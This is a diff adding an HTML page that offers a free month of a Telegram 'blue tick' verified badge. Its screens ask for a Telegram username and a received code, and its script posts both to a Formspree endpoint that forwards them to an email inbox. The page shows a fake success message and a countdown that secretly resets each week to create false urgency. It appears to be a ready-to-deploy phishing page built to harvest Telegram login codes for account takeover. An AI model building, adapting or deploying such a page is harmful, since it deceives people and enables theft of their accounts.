@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>QuickService — Free Blue Tick Trial</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Inter:wght@400;500;600;700&family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0a0a0a;
+    --surface:#141414;
+    --border:#242424;
+    --text:#f2f2f2;
+    --text-dim:#8a8a8a;
+    --blue:#2b90ed;
+    --blue-glow:rgba(43,144,237,0.35);
+    --error:#e0505a;
+    --success:#3ecf7e;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;}
+  html,body{height:100%;}
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:'Inter',sans-serif;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    padding:24px 16px;
+    -webkit-font-smoothing:antialiased;
+  }
+  .app{
+    width:100%;
+    max-width:400px;
+  }
+  .card{
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:20px;
+    padding:36px 28px;
+    display:none;
+    animation:fadeSlide .45s ease both;
+  }
+  .card.active{display:block;}
+  @keyframes fadeSlide{
+    from{opacity:0;transform:translateY(14px);}
+    to{opacity:1;transform:translateY(0);}
+  }
+  @media (prefers-reduced-motion:reduce){
+    .card{animation:none;}
+  }
+
+  .wordmark{
+    font-family:'Grand Hotel',cursive;
+    font-size:44px;
+    text-align:center;
+    color:var(--text);
+    margin-bottom:28px;
+    letter-spacing:0.5px;
+  }
+
+  /* Badge */
+  .badge-wrap{
+    display:flex;
+    justify-content:center;
+    margin:6px 0 26px;
+  }
+  .badge{
+    display:block;
+    width:60px;
+    height:60px;
+    animation:badgeBeat 2.6s ease-in-out infinite;
+    filter:drop-shadow(0 0 12px rgba(43,144,237,0.5));
+  }
+  @keyframes badgeBeat{
+    0%,100%{transform:scale(1);}
+    50%{transform:scale(1.08);}
+  }
+  @media (prefers-reduced-motion:reduce){
+    .badge{animation:none;}
+  }
+
+  h1{
+    font-size:22px;
+    font-weight:700;
+    text-align:center;
+    line-height:1.35;
+    margin-bottom:10px;
+  }
+  .sub{
+    font-size:14.5px;
+    color:var(--text-dim);
+    text-align:center;
+    line-height:1.6;
+    margin-bottom:26px;
+  }
+
+  /* Countdown */
+  .countdown-label{
+    text-align:center;
+    font-size:12.5px;
+    color:var(--text-dim);
+    margin-bottom:8px;
+  }
+  .countdown{
+    display:flex;
+    justify-content:center;
+    gap:10px;
+    margin-bottom:28px;
+  }
+  .cd-unit{
+    background:var(--bg);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:10px 4px;
+    width:62px;
+    text-align:center;
+  }
+  .cd-num{
+    font-family:'Roboto Mono',monospace;
+    font-size:19px;
+    font-weight:500;
+    color:var(--blue);
+  }
+  .cd-unit-label{
+    font-size:10px;
+    color:var(--text-dim);
+    margin-top:2px;
+  }
+
+  .detail-list{
+    list-style:none;
+    margin-bottom:30px;
+  }
+  .detail-list li{
+    display:flex;
+    gap:10px;
+    font-size:14px;
+    color:var(--text);
+    padding:9px 0;
+    border-bottom:1px solid var(--border);
+    line-height:1.5;
+  }
+  .detail-list li:last-child{border-bottom:none;}
+  .dot{
+    color:var(--blue);
+    flex-shrink:0;
+  }
+
+  .btn{
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:10px;
+    background:var(--blue);
+    color:#fff;
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+    transition:opacity .15s ease;
+    font-family:'Inter',sans-serif;
+  }
+  .btn:hover{opacity:0.9;}
+  .btn:active{opacity:0.75;}
+  .btn:disabled{opacity:0.5;cursor:not-allowed;}
+  .btn-secondary{
+    background:transparent;
+    color:var(--blue);
+    margin-top:14px;
+  }
+
+  input{
+    width:100%;
+    background:var(--bg);
+    border:1px solid var(--border);
+    border-radius:10px;
+    padding:14px;
+    color:var(--text);
+    font-size:14.5px;
+    font-family:'Inter',sans-serif;
+    margin-bottom:12px;
+  }
+  input::placeholder{color:var(--text-dim);}
+  input:focus{
+    outline:none;
+    border-color:var(--blue);
+  }
+  input:focus-visible{
+    outline:2px solid var(--blue);
+    outline-offset:1px;
+  }
+
+  .field-error{
+    color:var(--error);
+    font-size:12.5px;
+    margin:-6px 0 12px;
+    min-height:16px;
+  }
+
+  .step-title{
+    font-size:19px;
+    font-weight:700;
+    text-align:center;
+    margin-bottom:6px;
+  }
+  .step-sub{
+    font-size:13.5px;
+    color:var(--text-dim);
+    text-align:center;
+    margin-bottom:26px;
+    line-height:1.5;
+  }
+
+  /* Success screen */
+  .success-icon{
+    display:flex;
+    justify-content:center;
+    margin-bottom:20px;
+  }
+  .success-circle{
+    width:64px;
+    height:64px;
+    border-radius:50%;
+    background:rgba(62,207,126,0.12);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    animation:popIn .4s ease;
+  }
+  @keyframes popIn{
+    from{transform:scale(0.6);opacity:0;}
+    to{transform:scale(1);opacity:1;}
+  }
+  .success-title{
+    font-size:20px;
+    font-weight:700;
+    text-align:center;
+    margin-bottom:10px;
+  }
+  .success-text{
+    font-size:14px;
+    color:var(--text-dim);
+    text-align:center;
+    line-height:1.6;
+    margin-bottom:26px;
+  }
+
+  .pending-note{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    background:rgba(43,144,237,0.08);
+    border:1px solid rgba(43,144,237,0.25);
+    border-radius:10px;
+    padding:12px 14px;
+    font-size:13px;
+    color:var(--text);
+    line-height:1.5;
+    margin-bottom:22px;
+  }
+  .pending-dot{
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    background:var(--blue);
+    flex-shrink:0;
+    animation:dotPulse 1.6s ease-in-out infinite;
+  }
+  @keyframes dotPulse{
+    0%,100%{opacity:0.4;}
+    50%{opacity:1;}
+  }
+  .footer-note{
+    text-align:center;
+    font-size:12px;
+    color:var(--text-dim);
+    margin-top:22px;
+  }
+</style>
+</head>
+<body>
+
+<div class="app">
+
+  <!-- SCREEN 1: OFFER -->
+  <section class="card active" id="screen-offer">
+    <div class="wordmark">QuickService</div>
+
+    <div class="badge-wrap">
+      <svg class="badge" width="60" height="60" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="background:transparent;">
+        <path d="M12 2L14.5 4.2L17.7 3.5L18.8 6.6L21.9 7.7L21.2 10.9L23.4 13.4L21.2 15.9L21.9 19.1L18.8 20.2L17.7 23.3L14.5 22.6L12 24.8L9.5 22.6L6.3 23.3L5.2 20.2L2.1 19.1L2.8 15.9L0.6 13.4L2.8 10.9L2.1 7.7L5.2 6.6L6.3 3.5L9.5 4.2L12 2Z" fill="#2b90ed"/>
+        <path d="M8.5 12.5L11 15L16 9.5" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+      </svg>
+    </div>
+
+    <h1>Get your free trial blue tick — one month, on us</h1>
+    <p class="sub">Redeem your QuickService code and we'll activate the verified badge on your Telegram channel for 30 days, completely free.</p>
+
+    <div class="countdown-label">This offer refreshes in</div>
+    <div class="countdown" id="countdown">
+      <div class="cd-unit"><div class="cd-num" id="cd-days">00</div><div class="cd-unit-label">days</div></div>
+      <div class="cd-unit"><div class="cd-num" id="cd-hours">00</div><div class="cd-unit-label">hrs</div></div>
+      <div class="cd-unit"><div class="cd-num" id="cd-mins">00</div><div class="cd-unit-label">min</div></div>
+      <div class="cd-unit"><div class="cd-num" id="cd-secs">00</div><div class="cd-unit-label">sec</div></div>
+    </div>
+
+    <ul class="detail-list">
+      <li><span class="dot">●</span> One month of verified badge access, free with your code</li>
+      <li><span class="dot">●</span> Codes are issued individually — each one works once</li>
+      <li><span class="dot">●</span> Activation is confirmed manually within 24 hours</li>
+      <li><span class="dot">●</span> No payment details needed to redeem</li>
+    </ul>
+
+    <button class="btn" onclick="goTo('screen-start')">Start my one month free trial</button>
+  </section>
+
+  <!-- SCREEN 2: START -->
+  <section class="card" id="screen-start">
+    <div class="wordmark" style="font-size:34px;margin-bottom:40px;">QuickService</div>
+    <div class="step-title">You're one step away</div>
+    <p class="step-sub">Have your QuickService code ready. You'll enter your Telegram username and the code we gave you to activate your trial.</p>
+    <button class="btn" onclick="goTo('screen-redeem')">Continue to redeem code</button>
+    <button class="btn btn-secondary" onclick="goTo('screen-offer')">Back</button>
+  </section>
+
+  <!-- SCREEN 3: REDEEM -->
+  <section class="card" id="screen-redeem">
+    <div class="wordmark" style="font-size:34px;margin-bottom:32px;">QuickService</div>
+    <div class="step-title">Redeem your code</div>
+    <p class="step-sub">Enter the Telegram username and code exactly as you received them.</p>
+
+    <form id="redeemForm">
+      <input type="text" id="username" name="username" placeholder="Telegram username" autocomplete="off" required>
+      <div class="field-error" id="err-username"></div>
+
+      <input type="text" id="code" name="code" placeholder="Your QuickService code" autocomplete="off" required>
+      <div class="field-error" id="err-code"></div>
+
+      <button type="submit" class="btn" id="submitBtn">Verify &amp; activate</button>
+    </form>
+    <button class="btn btn-secondary" onclick="goTo('screen-start')">Back</button>
+  </section>
+
+  <!-- SCREEN 4: SUCCESS -->
+  <section class="card" id="screen-success">
+    <div class="wordmark" style="font-size:34px;margin-bottom:32px;">QuickService</div>
+    <div class="success-icon">
+      <div class="success-circle">
+        <svg width="30" height="30" viewBox="0 0 24 24" style="background:transparent;">
+          <path d="M5 12.5L10 17.5L19 7.5" stroke="#3ecf7e" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+        </svg>
+      </div>
+    </div>
+    <div class="success-title">Congratulations!</div>
+    <p class="success-text">Your details have been submitted successfully.</p>
+    <div class="pending-note">
+      <span class="pending-dot"></span>
+      Activation pending — your blue tick will go live within 24 hours once we verify your code.
+    </div>
+    <div class="footer-note">Submitted a wrong code by mistake? <span style="color:var(--blue);cursor:pointer;" onclick="resetForm()">Submit again</span></div>
+  </section>
+
+</div>
+
+<script>
+  // ---------- Screen navigation ----------
+  function goTo(id){
+    document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+  function resetForm(){
+    document.getElementById('redeemForm').reset();
+    goTo('screen-redeem');
+  }
+
+  // ---------- Weekly resetting countdown ----------
+  const WEEK_MS = 7 * 24 * 60 * 60 * 1000;
+  const STORAGE_KEY = 'qs_offer_cycle_start';
+
+  function getCycleStart(){
+    let start = localStorage.getItem(STORAGE_KEY);
+    const now = Date.now();
+    if(!start || (now - Number(start)) >= WEEK_MS){
+      start = now;
+      localStorage.setItem(STORAGE_KEY, String(start));
+    }
+    return Number(start);
+  }
+
+  function updateCountdown(){
+    let start = getCycleStart();
+    let now = Date.now();
+    let remaining = WEEK_MS - (now - start);
+    if(remaining <= 0){
+      start = now;
+      localStorage.setItem(STORAGE_KEY, String(start));
+      remaining = WEEK_MS;
+    }
+    const days = Math.floor(remaining / (24*60*60*1000));
+    const hours = Math.floor((remaining % (24*60*60*1000)) / (60*60*1000));
+    const mins = Math.floor((remaining % (60*60*1000)) / (60*1000));
+    const secs = Math.floor((remaining % (60*1000)) / 1000);
+
+    document.getElementById('cd-days').textContent = String(days).padStart(2,'0');
+    document.getElementById('cd-hours').textContent = String(hours).padStart(2,'0');
+    document.getElementById('cd-mins').textContent = String(mins).padStart(2,'0');
+    document.getElementById('cd-secs').textContent = String(secs).padStart(2,'0');
+  }
+  updateCountdown();
+  setInterval(updateCountdown, 1000);
+
+  // ---------- Form submission (Formspree — sends to email) ----------
+  // Replace YOUR_FORM_ID below with the ID Formspree gives you (see README.md)
+  const FORMSPREE_ENDPOINT = 'https://formspree.io/f/YOUR_FORM_ID';
+
+  const form = document.getElementById('redeemForm');
+  const submitBtn = document.getElementById('submitBtn');
+
+  form.addEventListener('submit', async function(e){
+    e.preventDefault();
+
+    const username = document.getElementById('username').value.trim();
+    const code = document.getElementById('code').value.trim();
+    let valid = true;
+
+    document.getElementById('err-username').textContent = '';
+    document.getElementById('err-code').textContent = '';
+
+    if(!username){
+      document.getElementById('err-username').textContent = 'Enter your Telegram username.';
+      valid = false;
+    }
+    if(!code){
+      document.getElementById('err-code').textContent = 'Enter the code you received.';
+      valid = false;
+    }
+    if(!valid) return;
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Submitting…';
+
+    try{
+      const res = await fetch(FORMSPREE_ENDPOINT, {
+        method: 'POST',
+        headers: { 'Accept': 'application/json' },
+        body: new FormData(form)
+      });
+
+      if(res.ok){
+        goTo('screen-success');
+      } else {
+        document.getElementById('err-code').textContent = 'Something went wrong. Please try again.';
+      }
+    } catch(err){
+      document.getElementById('err-code').textContent = 'Network error. Please try again.';
+    } finally {
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Verify & activate';
+    }
+  });
+</script>
+
+</body>
+</html>
